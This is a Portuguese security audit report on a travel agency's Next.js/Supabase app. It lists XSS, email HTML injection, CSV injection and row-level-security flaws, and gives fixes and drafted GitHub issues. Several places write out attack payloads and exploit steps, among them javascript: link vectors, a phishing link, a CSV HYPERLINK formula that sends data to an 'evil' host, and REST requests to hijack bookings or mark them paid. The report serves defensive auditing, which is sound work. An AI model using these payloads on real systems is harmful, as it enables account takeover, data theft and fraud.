O `markdown-to-jsx` 9.8.2 tem sanitizer padrão que bloqueia `javascript:`, `vbscript:` e `data:` — mas **só no formato de link inline**. **Executei o renderizador** para não depender de leitura de código:

| Vetor markdown | Resultado |
|---|---|
| `[c](javascript:alert(1))` | ✅ sanitizado → `href=""` |
| `[c][x]` + `[x]: javascript:alert(1)` (**referência**) | ❌ **`href="javascript:alert(1)"`** |
| `<javascript:alert(1)>` (**autolink**) | ❌ **`href="javascript:alert(1)"`** |
| `[c](JaVaScRiPt:alert(1))` | ✅ sanitizado |
| `[c](data:text/html;base64,…)` | ✅ sanitizado |
| `<img src=x onerror=alert(1)>` | ✅ escapado como texto |
| `<script>alert(1)</script>` | ✅ escapado como texto |

O React 18 apenas **avisa** sobre `javascript:` em `href` — e renderiza.

**Quem explora:** quem escreve markdown — papel `conteudo`, via `blog_posts.content`, `pages.content` e blocos de página. Exige clique da vítima, por isso é menos grave que o A-07.

**Correção:** passar um `sanitizer` explícito nas `options` do `<Markdown>`, ou validar o esquema dentro de `MarkdownLink` antes de renderizar (`if (!/^(https?:|mailto:|tel:|\/|#)/i.test(href)) return <span>{children}</span>`).

---

#### 🟡 **A-19 · MÉDIA — URLs vindas do banco entram em `href`/`src` sem checagem de esquema**

**Arquivos:**

| Local | Linha | Origem do dado |
|---|---|---|
| `src/components/Header.tsx` | 80-87 | `menu_items.url` |
| `src/components/Drawer.tsx` | 76-95 | `menu_items.url` |
| `src/components/home/HeroBanner.tsx` | 27-33 (`href` na **30**) | `home_banners.button_url` |
| `src/components/home/PromotionalSection.tsx` | 15-22 (`href` na **18**) | `home_sections` |
| `src/components/PageBlocks.tsx` | 11-25 (`<a href={url}>` na **21**) | bloco de página |
| `src/components/PageBlocks.tsx` | 27-36 (`toEmbedUrl`, fallback cru na **35**) e 131-153 (`<iframe src={embed}>` na **141**) | bloco de vídeo |

```tsx
// src/components/Header.tsx:80-87 — o padrão que se repete
            return item.url.startsWith("/") ? (
              <Link className={menuLinkClass} href={item.url} key={item.id}>
```

O teste é sempre `startsWith("/")`. Qualquer coisa que não comece com `/` cai no `<a href={item.url}>` — inclusive `javascript:`. O `toEmbedUrl` de `PageBlocks.tsx:35` é pior: se a URL não casar com YouTube nem Vimeo, ela vai **crua** para o `src` de um `<iframe>`.

**Quem explora:** `conteudo` (menu, banners, blocos, vídeo).

**Correção:** um helper único `hrefSeguro(url)` aplicado nos 6 pontos, com lista branca de esquemas; e `toEmbedUrl` deve devolver `null` quando não reconhecer o provedor, em vez da URL crua.

---

#### 🟡 **A-20 · MÉDIA — Nome do comprador entra sem escape no HTML do e-mail transacional**

**Arquivo:** `src/lib/server/notifications.ts:62-66`

```ts
  const html =
    message.html ??
    `<div style="font-family:sans-serif;line-height:1.6">${message.text
      .split("\n")
      .join("<br>")}</div>`;
```

`message.text` é montado com `firstName` (`:149`, derivado de `booking.customer_name`), `product`, `transfer.meeting_point` e `transfer.driver_name`. A única transformação é `\n → <br>` — **não há escape de HTML**.

**Por que é explorável:** `customer_name` vem do corpo de `/api/bookings/create-pending` (`:41-42, 67-71`), rota **pública**. Um nome como `Ana<a href="https://site-falso/pagar">Clique para pagar</a>` é enviado como HTML pelo Resend (`email.ts:32`), num e-mail que sai **do domínio da agência**, com a marca dela. Combinado com o A-14 (atribuir reserva ao e-mail de terceiro), o atacante **escolhe o destinatário**: manda um e-mail com a marca da RW Turismo, contendo o link que ele quiser, para o cliente que ele quiser.

**Correção:** escapar `message.text` antes de montar o HTML (`&`, `<`, `>`, `"`), e validar `customer_name` na entrada (sem `<` e `>`).

---

#### 🟡 **A-21 · MÉDIA — CSV injection nas exportações do admin**

**Arquivo:** `src/lib/csv.ts:6-11`

```ts
  const escapeCell = (value: string | number | null | undefined) => {
    const text = String(value ?? "");
    return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
  };
```

O escape cobre o formato CSV, mas não o **prefixo de fórmula**. Um campo iniciado por `=`, `+`, `-` ou `@` é interpretado como fórmula quando a agência abre o arquivo no Excel.

**Por que é explorável:** `passengers.full_name` e `bookings.customer_name` são 100% controlados por quem compra (rota pública). Um nome como `=HYPERLINK("https://evil/?d="&A1,"Ana")` executa na máquina de quem exportar a lista de passageiros. Aciona pela exportação de embarque (`api/admin/departures/[id]/log-export.ts`).

**Correção:** prefixar com `'` (apóstrofo) toda célula que comece com `=`, `+`, `-`, `@`, tab ou CR.

---

## 5. Achados descartados na verificação (prova de cobertura)

A camada adversarial derrubou 6 alegações. Registro para mostrar o que foi investigado e **não** é problema:

| Alegação | Por que foi descartada |
|---|---|
| `notification_log` vaza o `access_token` para `financeiro` | Fatos corretos, **impacto errado**: a mesma role já lê o token direto de `bookings`. A causa raiz real virou o **A-03** |
| `passengers_financeiro_select` recriada em contradição entre arquivos | O cético achou uma **4ª ocorrência** numa migration posterior (`20260803000000_checkout_fase1.sql:341`) que o auditor não viu — a definição final está correta |
| `getMyBookings` entrega o `access_token` ao navegador | O trecho é real, mas é **a própria reserva do usuário**, protegida por `user_id = auth.uid()`. Não é vazamento |
| `site_settings` com `using(true)` vaza segredo | As chaves realmente gravadas são identidade visual e funil de CRM. Rebaixado a **A-06 (informativa)** |
| `adotar_perfil_sem_login` permite adotar perfil de cliente alheio | O ataque exigiria um perfil órfão **com e-mail preenchido**, e **nenhum caminho do código produz essa linha** — a própria evidência citada provava o contrário |
| `requireEnv` aceita placeholder como segredo válido | Cadeia causal errada: `isServiceRoleConfigured()` lê a env direto, nunca passa por `requireEnv`. É higiene, não falha |

---

## 6. Plano de ação priorizado

### P1 — Fazer agora (dias)

| # | Ação | Arquivo | Esforço |
|---|---|---|---|
| 1 | **Amarrar o e-mail do perfil ao JWT** no `WITH CHECK`, e estender o trigger para `BEFORE INSERT OR UPDATE` | `supabase/rls.sql:140-144` | ~1h |
| 2 | **Auditar a base agora**: procurar `users_profiles` com e-mail que não bate com o `auth.users` correspondente — pode já ter sido explorado | consulta SQL pontual | ~30min |
| 3 | **`sandbox` no iframe** (`allow-scripts` sem `allow-same-origin`) e **remover ou isolar** o caminho `res.write` | `src/pages/paginas/[slug].tsx:51` e `:151-156` | ~2h |
| 4 | **Restringir `custom_html` a `is_admin()`** | `supabase/rls.sql:853-856` | ~1h |
| 5 | **Trocar `bookings_operacoes_all` (`for all`)** por policies por comando + trigger nas colunas financeiras | `supabase/rls.sql:726-730` | ~3h |

> O item 2 não é opcional. O A-01 não deixa rastro óbvio, e a única forma de saber se já aconteceu é comparar `users_profiles.email` com o e-mail real da conta em `auth.users`.

### P2 — Próxima sprint (semanas)

| # | Ação | Arquivo |
|---|---|---|
| 6 | Travar `approved = false` no insert público de depoimento | `supabase/rls.sql:598-600` |
| 7 | Escapar HTML no e-mail transacional + validar `customer_name` na entrada | `src/lib/server/notifications.ts:62-66` |
| 8 | Helper `hrefSeguro()` nos 6 sinks de URL + `toEmbedUrl` devolvendo `null` | `Header.tsx:87`, `Drawer.tsx`, `HeroBanner.tsx:30`, `PromotionalSection.tsx:18`, `PageBlocks.tsx:21,35,141` |
| 9 | `sanitizer` explícito no `<Markdown>` (fecha referência e autolink) | `src/components/MarkdownContent.tsx:34-42` |
| 10 | Prefixo `'` em célula que comece com `= + - @` | `src/lib/csv.ts:6-11` |
| 11 | Trocar a checagem manual por `requireAdmin` | `src/pages/api/admin/integration-status.ts:14-21` |
| 12 | Parar de mandar `value` das chaves para o navegador | `src/pages/admin/integracoes.tsx:133-135` |
| 13 | Fechar `profiles_staff_select` e `system_logs_staff_select` nos papéis certos | `supabase/rls.sql:651-655` e `:907-910` |
| 14 | Verificação de e-mail antes de vincular a conta **já existente** | `create-pending.ts` + `customerAccount.ts:130-139` |

### P3 — Backlog (quando der)

| # | Ação | Arquivo |
|---|---|---|
| 15 | Tirar `access_token` de `bookings` (tabela própria ou revoke de coluna) + mascarar no log + retenção | `rls.sql:726-736`, `notifications.ts:162-166` |
| 16 | Restringir colunas de preço para `operacoes` | `supabase/rls.sql:695-702` |
| 17 | Amarrar `user_id` no insert público de `waitlist`/`leads` | `rls.sql:522-524`, `:591-593` |
| 18 | Newsletter por RPC com resposta constante | `rls.sql:491-492` |
| 19 | Lista branca de chaves em `site_settings_public_read` | `rls.sql:448-449` |
| 20 | `coalesce` no `phone` da adoção de perfil | `customerAccount.ts:171` |
| 21 | Atualizar `docs/env.md` | `docs/env.md` |
| 22 | **Testes pgTAP de policy** — o CI aplica `rls.sql` mas nenhum teste exercita RLS (`ci.yml:67` cria o role como `superuser`, que ignora RLS). Uma regressão de policy passa despercebida | `supabase/tests/` |
| 23 | Rate limit distribuído (hoje é em memória, por instância serverless) | `src/lib/server/rateLimit.ts:9-12` |

---

## 7. Issues para o GitHub

--- ISSUE 1 ---

**Título:** `[Segurança] Sequestro de reserva: a policy de INSERT de users_profiles não amarra o e-mail ao dono da conta`

**Labels:** `security`, `critica`, `rls`

### Problema

`profiles_insert_own_customer` amarra `user_id` e `role`, mas deixa a coluna `email` livre. Como o perfil é criado **do navegador** (anon key), o RLS é a única barreira — e o e-mail é a chave de identidade do cliente no checkout sem cadastro.

Um atacante autenticado planta uma linha com o e-mail de uma vítima; quando a vítima compra sem cadastro, a reserva nasce em nome do atacante.

### Evidência

`supabase/rls.sql:139-144`
```sql
drop policy if exists "profiles_insert_own_customer" on public.users_profiles;
create policy "profiles_insert_own_customer"
on public.users_profiles
for insert
to authenticated
with check (user_id = auth.uid() and role = 'customer');
```

`src/lib/auth/customerAccount.ts:131-137`
```ts
    const { data } = await admin
      .from("users_profiles")
      .select("id, user_id")
      .eq("email", email)
      .maybeSingle();
    if (data?.user_id) return data.user_id;
```

Alcançado sem autenticação por `src/pages/api/bookings/create-pending.ts:73` (sessão explicitamente opcional, `:45-52`).

O trigger `prevent_customer_profile_identity_changes` **não protege**: é `BEFORE UPDATE` (`rls.sql:114-117`), não cobre INSERT.

### Por que é explorável

1. Atacante cria conta com e-mail descartável → JWT `authenticated`.
2. `POST /rest/v1/users_profiles` com `{"user_id":"<dele>","role":"customer","email":"vitima@dominio.com"}` — passa no `WITH CHECK` e no `unique(email)`.
3. Vítima compra sem cadastro com o e-mail dela.
4. `resolveCustomerUserId` acha a linha plantada e devolve o `user_id` do atacante.
5. `bookings.user_id` = atacante.

### Impacto

Pelo navegador, com a anon key, o atacante lê:
- reserva inteira, incluindo `access_token` (`rls.sql:215-219` + `src/lib/bookings/client.ts:9-11` faz `select("*")`)
- `full_name`, `document` e `birth_date` dos passageiros, **incluindo menores** (`rls.sql:270-283`)
- os pagamentos (`rls.sql:241-244`)

A vítima ainda fica trancada para fora do site (colisão no `unique(email)`, `profile.ts:104-114`).

### Correção sugerida

```sql
-- mínimo
with check (
  user_id = auth.uid()
  and role = 'customer'
  and (email is null or email = lower(auth.jwt() ->> 'email'))
);
```
Preferível: remover o INSERT do cliente e criar o perfil por trigger `AFTER INSERT` em `auth.users`. Em qualquer caso, estender `prevent_customer_profile_identity_changes` para `BEFORE INSERT OR UPDATE`.

### Critérios de aceite

- [ ] Um usuário autenticado **não** consegue inserir perfil com e-mail diferente do seu JWT (teste pgTAP)
- [ ] O trigger de identidade cobre INSERT além de UPDATE
- [ ] `resolveCustomerUserId` só reaproveita perfil cujo e-mail foi verificado
- [ ] Auditoria da base feita: nenhuma linha de `users_profiles` com e-mail divergente do `auth.users` correspondente
- [ ] Teste de regressão em `supabase/tests/`

--- FIM ISSUE 1 ---


--- ISSUE 2 ---

**Título:** `[Segurança] pages.custom_html executa JavaScript na origem do site — escalonamento de conteudo para admin`

**Labels:** `security`, `alta`, `xss`, `rls`

### Problema

A coluna `pages.custom_html`, gravável pelo papel `conteudo`, é servida como HTML cru **na origem do site** por dois caminhos. O iframe que o código descreve como "isolado" usa `srcDoc` **sem `sandbox`** — e `srcdoc` sem `sandbox` herda a origem do pai.

### Evidência

`src/pages/paginas/[slug].tsx:151-156`
```tsx
    if (page.custom_html && !page.custom_html_chrome) {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.write(page.custom_html);
      res.end();
      return { props: {} };
    }
```

`src/pages/paginas/[slug].tsx:39-54`
```tsx
    <iframe
      className="block w-full border-0"
      ...
      srcDoc={html}          // linha 51 — sem sandbox
```

`supabase/rls.sql:853-856`
```sql
create policy "pages_conteudo_all" on public.pages
for all to authenticated
using (public.has_staff_role(array['conteudo']))
with check (public.has_staff_role(array['conteudo']));
```

Escrita sem passar por API: `src/lib/content/client.ts:116-121`.

### Por que é explorável

1. `conteudo` (o papel de MENOR privilégio — não vê caixa nem reservas) publica página com script.
2. Qualquer visitante de `/paginas/<slug>` executa o script na origem do site.
3. O script lê o token do Supabase no `localStorage` e chama a PostgREST como a vítima.
4. Se a vítima for admin, exfiltra `integration_secrets` — `stripe_secret_key`, `resend_api_key`, `uazapi_token`, `stripe_webhook_secret`.

Agrava: `src/pages/admin/integracoes.tsx:133-135` traz o **valor em claro** das chaves para o navegador do admin; o mascaramento é só de renderização (`:226-227`).

### Impacto

Escalonamento de `conteudo` → `admin`; roubo de sessão de qualquer visitante; comprometimento das chaves de produção de Stripe, Resend e UAZAPI.

### Correção sugerida

1. `sandbox="allow-scripts allow-forms"` (**sem** `allow-same-origin`) no iframe da linha 51.
2. Servir o caminho `res.write` de um subdomínio separado, ou remover o modo sem chrome.
3. Restringir `custom_html` a `is_admin()` (policy `as restrictive` ou coluna em tabela própria).

### Critérios de aceite

- [ ] Script dentro de `custom_html` não acessa `localStorage`/cookies da origem principal
- [ ] `conteudo` não consegue mais gravar `custom_html` (teste pgTAP)
- [ ] O comentário "landing isolada em iframe" só permanece se o isolamento for real
- [ ] Páginas com HTML existentes revisadas antes do deploy

--- FIM ISSUE 2 ---


--- ISSUE 3 ---

**Título:** `[Segurança] Papel operacoes confirma pagamento e altera valor de reserva direto na tabela, contornando as duas travas do financeiro`

**Labels:** `security`, `alta`, `rls`

### Problema

`bookings_operacoes_all` é `for all` sem restrição de coluna. O projeto tem duas travas dizendo que só `admin`/`financeiro` confirmam dinheiro — e `operacoes` não precisa passar por nenhuma delas.

### Evidência

`supabase/rls.sql:726-730`
```sql
create policy "bookings_operacoes_all"
on public.bookings
for all to authenticated
using (public.has_staff_role(array['operacoes']))
with check (public.has_staff_role(array['operacoes']));
```

Travas contornadas:
- `src/pages/api/admin/bookings/[id]/confirm-payment.ts:23` → `requireStaff(req, res, ["admin", "financeiro"])`
- guard interno de `admin_confirm_manual_payment` em `supabase/schema.sql:1150-1152`

### Por que é explorável

Do console do navegador, com a própria sessão:
```
PATCH /rest/v1/bookings?id=eq.<uuid>   { "payment_status": "paid", "status": "confirmed" }
```
Passa direto no RLS. O mesmo vale para `total_amount`.

### Impacto

Quebra de segregação de funções com efeito financeiro direto: reserva confirmada sem pagamento, ou valor alterado, por um papel que a organização definiu como não-financeiro. Sem trilha no fluxo de confirmação (que é onde os logs são gravados).

### Correção sugerida

Trocar `for all` por policies separadas por comando e proteger `payment_status`, `status` e `total_amount` com trigger. **O padrão já existe no projeto**: `passengers_protect_document_columns()` em `supabase/schema.sql:2749-2784` faz exatamente isso para outra tabela.

### Critérios de aceite

- [ ] `operacoes` não altera `payment_status`, `status` nem `total_amount` direto (teste pgTAP)
- [ ] `operacoes` continua fazendo o trabalho legítimo dele nas reservas
- [ ] `financeiro`/`admin` continuam confirmando pela rota de API
- [ ] Mesma revisão aplicada a `product_dates_operacoes_update` (`rls.sql:695-702`), cujo comentário promete uma restrição que a policy não impõe

--- FIM ISSUE 3 ---


--- ISSUE 4 ---

**Título:** `[Segurança] Injeção de HTML em e-mail transacional e CSV injection nas exportações — dados vindos de rota pública`

**Labels:** `security`, `media`, `xss`

> Agrupa dois defeitos com a mesma raiz: dado de rota pública (`customer_name`, `full_name`) chega a um formato de saída sem escape.

### Problema A — HTML de e-mail sem escape

`src/lib/server/notifications.ts:62-66`
```ts
  const html =
    message.html ??
    `<div style="font-family:sans-serif;line-height:1.6">${message.text
      .split("\n")
      .join("<br>")}</div>`;
```

`message.text` contém `firstName` (`:149`, de `booking.customer_name`), `product`, `transfer.meeting_point` e `transfer.driver_name`. A única transformação é `\n → <br>`.

`customer_name` vem do corpo de `/api/bookings/create-pending` (`:41-42, 67-71`) — rota pública, sem autenticação.

**Explorável:** nome como `Ana<a href="https://site-falso/pagar">Clique para pagar</a>` sai como HTML pelo Resend (`email.ts:32`), num e-mail **do domínio da agência**. Combinado com a atribuição de reserva por e-mail, o atacante escolhe o destinatário.

### Problema B — CSV injection

`src/lib/csv.ts:6-11`
```ts
  const escapeCell = (value: string | number | null | undefined) => {
    const text = String(value ?? "");
    return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
  };
```

Cobre o formato CSV, não o prefixo de fórmula. `passengers.full_name` como `=HYPERLINK("https://evil/?d="&A1,"Ana")` executa quando a agência abre a exportação de embarque (`api/admin/departures/[id]/log-export.ts`) no Excel.

### Impacto

- **A:** phishing com a marca e o domínio da agência, entregue por infraestrutura confiável (SPF/DKIM válidos)
- **B:** execução na máquina de quem exporta — exfiltração de conteúdo da planilha

### Correção sugerida

- **A:** escapar `message.text` (`&`, `<`, `>`, `"`) antes de montar o HTML; validar `customer_name` na entrada
- **B:** prefixar com `'` toda célula iniciada por `=`, `+`, `-`, `@`, tab ou CR

### Critérios de aceite

- [ ] Nome com `<a href>` chega ao e-mail como texto literal
- [ ] Nome iniciado por `=` é exportado sem virar fórmula
- [ ] Testes unitários cobrindo os dois casos
- [ ] Nenhum outro ponto monta HTML por concatenação (`grep` por template literal com `<` em `src/lib/server/`)

--- FIM ISSUE 4 ---


--- ISSUE 5 ---

**Título:** `[Segurança] URLs vindas do banco entram em href/src sem checagem de esquema — javascript: renderizado em 6 pontos`

**Labels:** `security`, `media`, `xss`

### Problema

Seis componentes recebem URL do banco (gravável por `conteudo`) e testam apenas `startsWith("/")`. O que não começar com `/` vai direto para `<a href>` ou `<iframe src>`. React 18 apenas **avisa** sobre `javascript:` — e renderiza.

### Evidência

| Arquivo | Linha | Origem |
|---|---|---|
| `src/components/Header.tsx` | 80-87 | `menu_items.url` |
| `src/components/Drawer.tsx` | 76-95 | `menu_items.url` |
| `src/components/home/HeroBanner.tsx` | 30 | `home_banners.button_url` |
| `src/components/home/PromotionalSection.tsx` | 18 | `home_sections` |
| `src/components/PageBlocks.tsx` | 21 | bloco de botão |
| `src/components/PageBlocks.tsx` | 35 e 141 | `toEmbedUrl` — fallback devolve a URL crua para `<iframe src>` |

```tsx
// src/components/Header.tsx:80-87
            return item.url.startsWith("/") ? (
              <Link className={menuLinkClass} href={item.url} key={item.id}>
```

**Relacionado —** `src/components/MarkdownContent.tsx:12-21`: o sanitizer padrão do `markdown-to-jsx` 9.8.2 cobre link inline, mas **não** link de referência nem autolink. Verificado executando o renderizador:

```
[c](javascript:alert(1))            -> href=""                    OK
[c][x] + [x]: javascript:alert(1)   -> href="javascript:alert(1)" FALHA
<javascript:alert(1)>               -> href="javascript:alert(1)" FALHA
```

### Impacto

XSS armazenado disparado por clique, em qualquer página do site, plantável pelo papel de menor privilégio da equipe.

### Correção sugerida

Um helper único, aplicado nos 6 pontos:
```ts
const ESQUEMAS_OK = /^(https?:|mailto:|tel:|\/|#)/i;
export const hrefSeguro = (url: string) => (ESQUEMAS_OK.test(url) ? url : "#");
```
`toEmbedUrl` deve devolver `null` quando não reconhecer o provedor. Em `MarkdownContent`, passar `sanitizer` explícito nas `options` ou validar dentro de `MarkdownLink`.

### Critérios de aceite

- [ ] `javascript:`, `data:` e `vbscript:` neutralizados nos 6 pontos
- [ ] Link de referência e autolink com `javascript:` neutralizados no markdown
- [ ] Teste unitário do helper cobrindo os vetores acima
- [ ] Nenhum `href={` ou `src={` com valor de banco sem passar pelo helper

--- FIM ISSUE 5 ---


--- ISSUE 6 ---

**Título:** `[Segurança] Divergências entre o papel exigido pela UI e o exigido pelo RLS`

**Labels:** `security`, `media`, `rls`

> Agrupa quatro divergências do mesmo tipo: a tela restringe mais do que o banco. Como as telas do `/admin` gravam **direto no Supabase pelo navegador**, o RLS *é* o backend — e a restrição da UI não vale nada.

### Evidência

**1. `profiles_staff_select` — `rls.sql:651-655`** (média)
```sql
create policy "profiles_staff_select"
on public.users_profiles
for select to authenticated
using (public.is_staff());
```
`is_staff()` = qualquer papel de equipe. `/admin/clients` é de `["admin","operacoes","financeiro"]` (`src/lib/auth/roles.ts:52`) — **`conteudo` não tem a tela, mas lê a base inteira** de clientes.
→ `using (public.has_staff_role(array['admin','operacoes','financeiro']))`

**2. `system_logs_staff_select` — `rls.sql:907-910`** (baixa)
UI reserva `/admin/logs` a `admin` (`roles.ts:82`); o banco entrega a trilha completa a toda a equipe, inclusive `view_passenger_document`.
→ `using (public.is_admin())`

**3. `site_settings` — `rls.sql:846-850`** (baixa)
Escreve `conteudo`; a tela de CRM é de `["admin","operacoes"]`. `operacoes` vê a tela e não salva; `conteudo` salva e não vê a tela.
→ separar as chaves de CRM em tabela própria

**4. `/api/admin/integration-status` — `src/pages/api/admin/integration-status.ts:14-21`** (baixa)
```ts
  if (profile?.role !== "admin") {
    return res.status(403).json({ error: "Acesso restrito." });
  }
```
Único dos 23 handlers que não usa `requireStaff` — e **não confere `active`** (contraste com `adminAuth.ts:34`). Admin desativado continua entrando, e `:44-55` usa a chave viva do Stripe.
→ `const admin = await requireAdmin(req, res); if (!admin) return;`

### Impacto

Acesso a dado pessoal e a trilha de auditoria por papéis que a organização decidiu excluir. Conta desativada mantendo acesso a integração.

### Critérios de aceite

- [ ] Para cada tela do `/admin`, o papel do RLS é igual ao de `ROUTE_ROLES`
- [ ] `conteudo` não lê `users_profiles` de cliente (teste pgTAP)
- [ ] Só `admin` lê `system_logs` (teste pgTAP)
- [ ] Os 23 handlers usam `requireStaff`/`requireAdmin`, sem checagem manual
- [ ] Admin desativado recebe 403 em `/api/admin/integration-status`

--- FIM ISSUE 6 ---


--- ISSUE 7 ---

**Título:** `[Segurança] Escritas públicas sem WITH CHECK adequado: depoimento auto-aprovado, lead/waitlist em nome de terceiro, oráculo de newsletter`

**Labels:** `security`, `media`, `rls`

> Agrupa as quatro policies de INSERT abertas a `anon`, todas com o mesmo defeito: o `WITH CHECK` valida pouco e deixa colunas de controle livres.

### Evidência

**1. `survey_responses_public_insert` — `rls.sql:598-600`** (média)
```sql
create policy "survey_responses_public_insert" on public.survey_responses
for insert to anon, authenticated
with check (rating >= 0 and rating <= 10);
```
`approved` (`schema.sql:1868`) fica livre → depoimento auto-aprovado vai direto para a home (`src/lib/content/server.ts:29-62`). Inserção por `src/lib/surveys/client.ts:11-16` (anon key). Limitado a uma por reserva pelo `unique(booking_id)`.
→ `with check (rating between 0 and 10 and approved = false)`

**2 e 3. `waitlist_public_insert` (`rls.sql:522-524`) e `leads_public_insert` (`rls.sql:591-593`)** (baixa)
Não amarram `user_id` a `auth.uid()`. Em `waitlist`, a vítima vê na conta dela (`waitlist_select_own_or_admin`, `rls.sql:526-529`) uma inscrição que nunca fez. Em `leads`, ficam livres `position`, `waitlist_id` e `deleted_at`.
→ `with check (user_id is null or user_id = auth.uid())` + colunas de controle só por `default`

**4. `newsletter_public_insert` — `rls.sql:491-492`** (baixa)
`unique(email)` + erro `23505` distingue "já existe" de "inserido" → enumeração de assinantes.
→ RPC `SECURITY DEFINER` com upsert e resposta constante

### Impacto

Publicação de conteúdo não moderado na home; poluição do funil de CRM; enumeração de e-mails da base.

### Critérios de aceite

- [ ] Insert público com `approved: true` é recusado (teste pgTAP)
- [ ] Insert público com `user_id` de terceiro é recusado (teste pgTAP)
- [ ] Newsletter devolve resposta idêntica para e-mail novo e já cadastrado
- [ ] Base atual revisada: nenhum depoimento aprovado sem passar por moderação

--- FIM ISSUE 7 ---


--- ISSUE 8 ---

**Título:** `[Segurança] O CI aplica rls.sql mas nenhum teste exercita policy — regressão de RLS passa despercebida`

**Labels:** `security`, `informativa`, `ci`, `test`

### Problema

O job `db` do CI aplica `schema.sql` + `rls.sql` e roda pgTAP, mas **nenhum dos testes exercita uma policy**. Pior: o role de teste é criado como `superuser`, e superuser **ignora RLS por padrão** — então mesmo um teste escrito hoje passaria sem exercitar nada.

Isso importa porque **11 dos 21 achados deste relatório se corrigem mudando uma policy**. Sem teste, cada correção pode ser desfeita silenciosamente na próxima migration.

### Evidência

`.github/workflows/ci.yml:67`
```yaml
          sudo -u postgres psql -c "create role runner superuser login password 'runner';"
```

`.github/workflows/ci.yml:74-81` aplica `rls.sql` e roda `pg_prove`.

`supabase/tests/booking_flow_test.sql:5-6` → `plan(11)`; `supabase/tests/coupons_test.sql:4` → `plan(5)`. Ambos testam RPCs de reserva e cupom — nenhum testa policy.

### Impacto

Nenhuma exploração direta. É a razão pela qual as brechas de policy deste relatório puderam existir sem alarme, e a razão pela qual voltariam.

### Correção sugerida

Criar `supabase/tests/rls_test.sql` com roles não-superuser por papel (`customer`, `conteudo`, `operacoes`, `financeiro`, `admin`), usando `set local role` + `set local request.jwt.claims`, cobrindo pelo menos:

- customer não lê reserva de outro customer
- customer não insere perfil com e-mail alheio (**ISSUE 1**)
- conteudo não lê `users_profiles` de cliente (**ISSUE 6**)
- conteudo não grava `custom_html` (**ISSUE 2**)
- operacoes não altera `payment_status` (**ISSUE 3**)
- anon não insere depoimento com `approved: true` (**ISSUE 7**)
- anon não lê `integration_secrets`

### Critérios de aceite

- [ ] O role de teste **não** é superuser (ou usa `force row level security`)
- [ ] `rls_test.sql` cobre os 7 cenários acima
- [ ] Cada correção deste relatório entra com o teste de regressão junto
- [ ] O CI falha se uma policy for afrouxada

--- FIM ISSUE 8 ---

---

## 8. Metodologia e limites

**Cobertura:** 23/23 handlers de API lidos por inteiro · 31/31 tabelas conferidas quanto a RLS · `supabase/rls.sql` (958 linhas) e `supabase/schema.sql` (2983 linhas) percorridos · 29 migrations · `ci.yml`, `vercel.json`, `docs/env.md`, `n8n/` · histórico completo do git · 6 sinks de `dangerouslySetInnerHTML` · componentes de renderização de conteúdo dinâmico.

**Verificação:** cada achado passou por um cético independente instruído a refutar relendo o arquivo, com regra de "na dúvida, refute" — 6 alegações foram derrubadas, 3 delas por confirmarem o código mas errarem o impacto. Depois disso, conferi pessoalmente cada achado publicado. Os vetores de XSS em markdown foram testados executando o renderizador real, não por leitura.

**Limites desta auditoria:**

1. **Análise estática apenas.** Nada foi executado contra o banco de produção. As policies foram lidas de `rls.sql`/`schema.sql`/migrations; **se houver policy criada à mão pelo painel do Supabase, ela não está aqui**. Vale confirmar que o banco de produção corresponde aos arquivos.
2. **`node_modules` fora de escopo** — não houve auditoria de dependências (`npm audit`, CVEs de transitivas).
3. **Não foram cobertas:** configuração do projeto Supabase (expiração de JWT, provedores de OAuth, rate limit do Auth), configuração da Vercel (headers, WAF), nem a conta Stripe/InfinitePay.
4. **Sem teste dinâmico:** nenhuma exploração foi executada de verdade. Os passos de ataque descritos são derivados do código lido; o único vetor testado empiricamente foi o de markdown (§4.5).

**Arquivos gerados:**
- `docs/security-audit/relatorio-auditoria-seguranca.md` — este relatório

---

## 9. O que foi implementado

Correções aplicadas em 2026-08-30, depois da auditoria. **Todo o SQL foi executado
de verdade** num Postgres 16 + pgTAP em contêiner — não é revisão de olho.

### 9.1 Achados corrigidos (16 dos 21)

| Achado | Sev. | O que mudou |
|---|---|---|
| **A-01** | 🔴 | `WITH CHECK` amarra `email` ao `auth.jwt()`; trigger de identidade passa a cobrir **INSERT** (era só UPDATE) |
| **A-07** | 🟠 | Trigger `pages_protect_custom_html` reserva a coluna ao admin; iframe ganhou `sandbox` (sem `allow-same-origin`) e a altura passou a vir por `postMessage` |
| **A-08** | 🟠 | Trigger `bookings_protect_financial_columns` em **INSERT e UPDATE** sobre `payment_status`, `status` e `total_amount` |
| **A-02** | 🟡 | `WITH CHECK ... and approved = false` |
| **A-09** | 🟡 | Trigger `product_dates_protect_price` sobre `price_override` |
| **A-10** | 🟡 | `profiles_staff_select` usa `has_staff_role([admin,operacoes,financeiro])` |
| **A-18** | 🟡 | `MarkdownLink` valida o esquema — fecha os bypasses de link de referência e autolink |
| **A-19** | 🟡 | `hrefSeguro()` nos 6 sinks; `toEmbedUrl` devolve `null` para provedor desconhecido |
| **A-20** | 🟡 | `escaparHtml()` no corpo do e-mail transacional |
| **A-21** | 🟡 | Prefixo `'` em célula iniciada por `= + - @ TAB CR` |
| **A-04** | 🔵 | `user_id` amarrado em `waitlist` e `leads` (mantendo `source`/`stage_id`) |
| **A-05** | 🔵 | RPC `assinar_newsletter()` com resposta constante; policy de insert removida |
| **A-11** | 🔵 | `system_logs_staff_select` usa `is_admin()` |
| **A-12** | 🔵 | Policy `site_settings_operacoes_crm` dá a `operacoes` o funil que a tela dele já mostrava |
| **A-13** | 🔵 | `requireAdmin` no lugar da checagem manual (passa a validar `active`) |
| **A-16** | 🔵 | RPC `listar_integracoes()` devolve só os 4 últimos caracteres; a tela parou de buscar `value` |
| **A-06** | ⚪ | `site_settings_public_read` vira lista branca de 8 chaves (`crm_stages` sai) |
| **A-15** | ⚪ | `phone` só preenche o que está vazio, nunca sobrescreve |
| **A-03** | 🟡 | *Parcial* — `access_token` mascarado no `notification_log`; tirar a coluna de `bookings` ficou no backlog (ver 9.4) |

### 9.2 O que a revisão das próprias correções encontrou

As correções passaram por uma segunda rodada adversarial (38 agentes, 20
problemas confirmados). Vale registrar porque metade não era teoria — eram
buracos e regressões reais no trabalho recém-feito.

**Buracos de segurança que a primeira correção não fechou**

| # | O que faltou | Como foi fechado |
|---|---|---|
| 1 | `operacoes` **criava** reserva já com `payment_status='paid'` — a policy é `FOR ALL` e o trigger nascera `BEFORE UPDATE` | trigger passou a cobrir `INSERT`, exigindo que reserva nova nasça pendente (teste 15) |
